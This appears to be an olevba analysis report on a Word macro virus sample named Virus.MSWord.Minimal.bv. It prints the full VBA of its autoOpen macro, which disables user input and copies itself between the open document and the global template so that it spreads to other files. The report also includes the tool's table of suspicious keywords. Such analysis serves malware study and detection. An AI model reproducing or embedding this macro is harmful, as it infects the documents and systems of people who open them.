olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.bv-b20ed36b7c74d2b0333b7c940d7a6cad527997a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.bv-b20ed36b7c74d2b0333b7c940d7a6cad527997a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Minimal.bv-b20ed36b7c74d2b0333b7c940d7a6cad527997a8 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
a$ = "autoOpen"
b$ = ":" + a$
gl$ = "Global"
c$ = gl$ + ":" + a$
d$ = "." + "DOT"
Dim fm1$
Dim gm1$
Dim Ff1$
Dim Encrypt
On Error GoTo -1: On Error GoTo Go1
WordBasic.FileSummaryInfo Update:=1
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (0)
Dim d1 As Object: Set d1 = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo d1
fm1$ = d1.Directory + "\" + d1.FileName + b$
gm1$ = c$
Ff1$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4))
If Ff1$ = d$ Then
Encrypt = WordBasic.IsExecuteOnly(fm1$)
WordBasic.MacroCopy gm1$, fm1$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy fm1$, gm1$
End If
Go1:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
